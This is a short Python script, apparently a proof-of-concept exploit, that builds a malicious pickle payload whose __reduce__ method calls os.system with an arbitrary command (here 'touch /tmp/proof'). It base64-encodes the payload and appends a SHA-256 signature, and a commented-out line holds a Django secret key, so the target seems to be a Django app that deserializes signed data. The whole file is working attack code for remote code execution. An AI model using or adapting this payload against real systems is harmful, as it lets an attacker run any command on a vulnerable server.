import base64
import hashlib
import os
import pickle


def get_rce(cmd: str):

    class RCE:

        def __reduce__(self):
            return os.system, (cmd,)

    return RCE()


if __name__ == '__main__':

    pickled = pickle.dumps(get_rce('touch /tmp/proof'))

    payload = base64.b64encode(pickled).decode()

    print(payload)

    m = hashlib.sha256()
    m.update(payload.encode())
    # m.update(b'django-insecure-fy0qvsky#6j@)l#ze0cbi6w7s2c43=c$r=pb^hbqj^p-f!ormz')
    hex_digest = m.digest()
    signature = base64.b64encode(hex_digest).decode()

    print(f'{payload}.{signature}')

